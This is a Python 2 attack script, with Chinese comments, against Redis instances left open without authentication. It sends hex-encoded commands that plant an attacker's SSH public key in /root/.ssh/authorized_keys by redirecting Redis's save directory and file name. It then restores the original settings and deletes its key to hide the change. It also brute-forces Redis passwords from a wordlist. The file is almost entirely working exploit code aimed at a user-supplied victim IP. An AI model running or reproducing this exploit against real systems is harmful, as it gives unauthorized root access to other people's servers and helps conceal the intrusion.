#!/usr/bin/env python
# -*- coding:utf-8 -*-
#Arrowzzzzzz@protonmail.com
#Redis未授权访问写入kay
#不需要把全部字符转换成字符流格式发送,只要把换行换成字符流就可以了
#socket中send和recv都用才算发送命令过去了
import socket,argparse
A = "\x2a\x32\x0d\x0a\x24\x34\x0d\x0a\x6b\x65\x79\x73\x0d\x0a\x24\x31\x0d\x0a\x2a\x0d\x0a"        #可以用socat进行端口转发并且监听,将\r替换成0b(垂直制表符)0b和\r作用相同-keys *.
#A1 = "\x2a\x32\x0d\x0a\x24\x34\x0d\x0a\x41\x55\x54\x48\x0d\x0a\x24\x39\x0d\x0a\x31\x32\x33\x34\x35\x36\x37\x38\x39\x0d\x0a"      #带123456789
Set_password = "*2\x0d\x0a$4\x0d\x0aAUTH\x0d\x0a$"        #不带密码,只带输入密码的格式
KEY = "\x2a\x33\x0d\x0a\x24\x33\x0d\x0a\x73\x65\x74\x0d\x0a\x24\x36\x0d\x0a\x7a\x7a\x7a\x7a\x7a\x7a\x0d\x0a\x24\x33\x39\x38\x0d\x0a\x0a\x0a\x0a\x73\x73\x68\x2d\x72\x73\x61\x20\x41\x41\x41\x41\x42\x33\x4e\x7a\x61\x43\x31\x79\x63\x32\x45\x41\x41\x41\x41\x44\x41\x51\x41\x42\x41\x41\x41\x42\x41\x51\x44\x4e\x72\x69\x30\x62\x2f\x70\x6f\x42\x36\x39\x39\x42\x4a\x71\x78\x67\x62\x43\x70\x49\x76\x33\x63\x71\x32\x54\x35\x6f\x36\x75\x35\x62\x34\x33\x46\x31\x4f\x38\x65\x70\x71\x68\x76\x39\x7a\x70\x46\x70\x77\x6d\x68\x2f\x76\x59\x56\x65\x71\x7a\x2f\x72\x35\x58\x43\x54\x36\x69\x30\x39\x4b\x37\x6a\x4b\x6b\x6c\x52\x56\x48\x52\x53\x5a\x75\x67\x51\x75\x30\x37\x4f\x30\x74\x36\x69\x78\x41\x6e\x4c\x69\x70\x35\x34\x41\x6e\x35\x31\x6e\x76\x4e\x71\x72\x78\x42\x5a\x55\x48\x68\x44\x41\x74\x45\x74\x6e\x54\x72\x76\x30\x57\x50\x71\x37\x7a\x38\x50\x36\x7a\x78\x59\x2b\x45\x6a\x72\x2f\x47\x72\x4e\x70\x58\x71\x76\x69\x35\x31\x2b\x46\x71\x6f\x31\x63\x39\x30\x52\x66\x62\x69\x72\x72\x59\x67\x49\x45\x2b\x79\x4c\x4a\x69\x68\x49\x78\x47\x77\x6a\x6e\x52\x76\x6e\x57\x46\x6f\x65\x52\x46\x73\x2b\x69\x73\x73\x6b\x52\x35\x6f\x47\x53\x56\x6a\x57\x41\x4f\x2b\x78\x63\x78\x68\x4c\x4b\x33\x51\x4f\x64\x52\x5a\x49\x39\x56\x48\x6a\x66\x59\x68\x71\x47\x35\x7a\x34\x4c\x78\x6b\x6b\x67\x79\x62\x74\x4f\x6f\x6b\x44\x35\x4d\x31\x4e\x5a\x79\x58\x77\x43\x75\x6e\x43\x65\x7a\x5a\x76\x51\x63\x77\x73\x36\x2f\x63\x65\x4c\x63\x54\x49\x54\x51\x47\x71\x6b\x68\x4f\x70\x78\x67\x30\x30\x42\x78\x4f\x31\x38\x62\x49\x52\x36\x59\x6f\x73\x2f\x54\x4b\x62\x54\x68\x2b\x77\x76\x4b\x78\x76\x44\x6d\x51\x35\x6b\x73\x6a\x4c\x42\x68\x50\x4e\x70\x43\x6a\x73\x48\x45\x6d\x50\x6c\x58\x52\x66\x69\x74\x6f\x55\x38\x63\x34\x79\x44\x20\x72\x6f\x6f\x74\x40\x41\x72\x72\x6f\x77\x0a\x0a\x0a\x0a\x0d\x0a"        #将key写入到数据库zzzzzz中
SET_SSH = "\x2a\x34\x0d\x0a\x24\x36\x0d\x0a\x63\x6f\x6e\x66\x69\x67\x0d\x0a\x24\x33\x0d\x0a\x73\x65\x74\x0d\x0a\x24\x33\x0d\x0a\x64\x69\x72\x0d\x0a\x24\x31\x31\x0d\x0a\x2f\x72\x6f\x6f\x74\x2f\x2e\x73\x73\x68\x2f\x0d\x0a"        #设置数据库的备份路径到.ssh中
D1 = "\x2a\x34\x0d\x0a\x24\x36\x0d\x0a\x63\x6f\x6e\x66\x69\x67\x0d\x0a\x24\x33\x0d\x0a\x73\x65\x74\x0d\x0a\x24\x31\x30\x0d\x0a\x64\x62\x66\x69\x6c\x65\x6e\x61\x6d\x65\x0d\x0a\x24\x31\x35\x0d\x0a\x61\x75\x74\x68\x6f\x72\x69\x7a\x65\x64\x5f\x6b\x65\x79\x73\x0d\x0a"        #设置备份的数据库名称为authorized_keys
D2 = "\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x73\x61\x76\x65\x0d\x0a"        #保存设置
Data_base_path1 = "\x2a\x33\x0d\x0a\x24\x36\x0d\x0a\x63\x6f\x6e\x66\x69\x67\x0d\x0a\x24\x33\x0d\x0a\x67\x65\x74\x0d\x0a\x24\x33\x0d\x0a\x64\x69\x72\x0d\x0a"        #获取数据库数据存放路径
B = '-NOAUTH Authentication required.\r\n'        #如果Redis有密码会输出此信息
Z = "+OK\r\n"
Redis_save_name_16 = "\x2a\x33\x0d\x0a\x24\x36\x0d\x0a\x63\x6f\x6e\x66\x69\x67\x0d\x0a\x24\x33\x0d\x0a\x67\x65\x74\x0d\x0a\x24\x31\x30\x0d\x0a\x64\x62\x66\x69\x6c\x65\x6e\x61\x6d\x65\x0d\x0a"         #查询Redis备份名称
Redis_save_name = ""
Redis_dir_origina = "*4\x0d\x0a$6\x0d\x0aconfig\x0d\x0a$3\x0d\x0aset\x0d\x0a$3\x0d\x0adir\x0d\x0a$"      #还原备份路径
Redis_save_name_key = "\x2a\x34\x0d\x0a\x24\x36\x0d\x0a\x63\x6f\x6e\x66\x69\x67\x0d\x0a\x24\x33\x0d\x0a\x73\x65\x74\x0d\x0a\x24\x31\x30\x0d\x0a\x64\x62\x66\x69\x6c\x65\x6e\x61\x6d\x65\x0d\x0a\x24"        #还原备份名
Delete_key = "*2\x0d\x0a$3\x0d\x0adel\x0d\x0a$6\x0d\x0azzzzzz\x0d\x0a"
Redis_dir = ""

def SOCKET(IP,PORT,PASSWORD):
    global R
    R = socket.socket(socket.AF_INET,socket.SOCK_STREAM)        #定义socket
    socket.setdefaulttimeout(10)        #定义socket超时时间单位分钟
    try:
        global Arrow
        R.connect((IP,PORT))  # 连接被攻击者Redis(端口是个整型,不能是字符型)
        Arrow = "True"
    except:
        print "%s:%s Unsuccessful connection,Unopened Redis service/Redis service port error." %(IP,PORT)
        Arrow = "False"
    if Arrow == "True":
        if PASSWORD != "":
            PASSWORD_len = len(PASSWORD)
            Password_password = Set_password + str(PASSWORD_len) + "\x0d\x0a" + PASSWORD + "\x0d\x0a"       #输入密码payload
            R.send(Password_password)
            DATA = R.recv(1024)
            if DATA != Z :
                print "you password error"
        R.send(A)        #发送命令到被攻击者Redis
        DATA = R.recv(1024)        #获取被攻击者Redis返回信息2048定义接收的字符串大小
        if DATA != B:        #判断Redis是否有密码
            print "Loopholes"
            C = raw_input("1.write key :")
            if C == "1":
                R.send(KEY)        #发送创建表(带ssh密钥)
                DATA = R.recv(1024)        #获取返回值
                if DATA == Z:
                    R.send(Data_base_path1)      #发送查询备份路径地址
                    DATA = R.recv(2048)
                    Redis_dir_1 = DATA.splitlines()
                    Redis_dir = Redis_dir_1[-1]        #获取Redis数据存放路径
                    Redis_dir_len = len(Redis_dir)
                    Redis_dir_origina_path = Redis_dir_origina + str(Redis_dir_len) + "\x0d\x0a" + Redis_dir + "\x0d\x0a"       #还原备份路径
                    print "Redis Backup path is %s ,if Backup path is wrong or empty,do not operate"%Redis_dir
                    attack_stop = raw_input("Do you attack?   yes/no :")
                    if attack_stop == "yes":
                        R.send(SET_SSH)         #设置备份路径到ssh
                        DATA = R.recv(1024)
                        if DATA == Z:
                            R.send(Redis_save_name_16)          #获取Redis原备份名
                            DATA = R.recv(2048)
                            Redis_save_name_1 = DATA.splitlines()
                            Redis_save_name = Redis_save_name_1[-1]         #Redis原备份名
                            Redis_save_name_len = len(Redis_save_name)          #Redis原备份名长度
                            Redis_save_original_name = Redis_save_name_key + str(Redis_save_name_len) + "\x0d\x0a" + Redis_save_name + "\x0d\x0a"       # 还原备份名称
                            R.send(D1)         #设置Redis备份名为authorized_keys
                            DATA = R.recv(1024)
                            if DATA == Z:
                                R.send(D2)         #保存
                                DATA = R.recv(1024)
                                if DATA == Z:
                                    print "Success,in process of restore config please do not stop"
                                    R.send(Redis_save_original_name)        #发送还原备份名命令
                                    DATA = R.recv(2048)
                                    print "Redis restore preservation original name " + DATA
                                    R.send(Redis_dir_origina_path)          #发送还原备份路径命令
                                    DATA = R.recv(2048)
                                    print "restore back up path " + DATA
                                    R.send(Delete_key)          #发送删除zzzzzz的命令
                                    DATA = R.recv(2048)
                                    print "delete key " + DATA + " (1 is ok)"
                                else:
                                    print "Preservation error,in process of restore config please do not stop"
                                    R.send(Redis_save_original_name)
                                    DATA = R.recv(2048)
                                    print "Redis restore preservation original name " + DATA
                                    R.send(Redis_dir_origina_path)
                                    DATA = R.recv(2048)
                                    print "restore back up path" + DATA
                                    R.send(Delete_key)
                                    DATA = R.recv(2048)
                                    print "delete key " + DATA + " (1 is ok)"
                            else:
                                print "set up back up path error,in process of restore config please do not stop"
                                R.send(Redis_dir_origina_path)
                                DATA = R.recv(2048)
                                print "restore back up path" + DATA
                                R.send(Delete_key)
                                DATA = R.recv(2048)
                                print "delete key " + DATA + " (1 is ok)"
                        else:
                            print "set data base backups path to .ssh error(" + DATA + "),in process of restore config please do not stop"
                            R.send(Delete_key)
                            DATA = R.recv(2048)
                            print "delete key " + DATA + " (1 is ok)"
                    else:
                        print "stop attack,in process of delete key please do not stop"
                        R.send(Delete_key)
                        DATA = R.recv(2048)
                        print "delete key " + DATA + " (1 is ok)"
                else:
                    print "write key error," + DATA
            else :
                print "more function remain  research and development"
        else :
            print "Redis data base set password"
            yes_no = raw_input("1.Do you suppose breaking the code;2.Input you think true password;         1/2 :")
            if yes_no == "1" :
                Dictionaries = raw_input("please input dictionaries path,as /root/Desktop/1.txt or ./1.txt :")
                Dictionaries_list = []
                with open(Dictionaries) as Dictionaries_txt:
                    Dictionaries_list_n = Dictionaries_txt.readlines()
                    for i in Dictionaries_list_n :
                        Dictionaries_list.append(i[:-1])
                    del Dictionaries_list_n
                Breaking_the_code(Dictionaries_list)
            else :
                password_for_you = raw_input("please input password:")
                password_for_you_len = len(password_for_you)
                password_payload = Set_password + str(password_for_you_len) + "\x0d\x0a" + password_for_you + "\x0d\x0a"
                R.send(password_payload)
                DATA = R.recv(2048)
                if DATA == Z :
                    print password_for_you + " password is true"
                else :
                    print password_for_you + " is false"
def Breaking_the_code(Dictionaries):
    Counter = 0
    List_len = len(Dictionaries)
    for i in Dictionaries :
        Counter += 1
        Dictionaries_len = len(i)
        password_payload = Set_password + str(Dictionaries_len) + "\x0d\x0a" + i + "\x0d\x0a"
        R.send(password_payload)
        DATA = R.recv(2048)
        if DATA == Z :
            print "true password is " + i
        else :
            print str(Counter) + "/" + str(List_len) + " error"
#SOCKET("123.0.0.23",6379)
if __name__ == '__main__':
    parser = argparse.ArgumentParser()        #创建一个ArgumentParser对象
    parser.add_argument('ip', type=str, help="Be attacked IP")        #添加参数
    parser.add_argument('-port', type=int, help="Be attacked PORT")        #添加可存在参数
    parser.add_argument('-password', type=str, help="Be attacked PASSWORD")         # 添加可存在参数
    args = parser.parse_args()        #ArgumentParser
    if args.port:
        if args.password :
            IP = args.ip
            PORT = args.port
            PASSWORD = args.password
            SOCKET(IP, PORT, PASSWORD)
        else :
            IP = args.ip        #获取ip给IP
            PORT = args.port        #获取port给PORT
            SOCKET(IP,PORT,"")
    elif args.password:
        IP = args.ip
        PASSWORD = args.password
        SOCKET(IP,6379,PASSWORD)
    else :
        SOCKET(args.ip,6379,"")
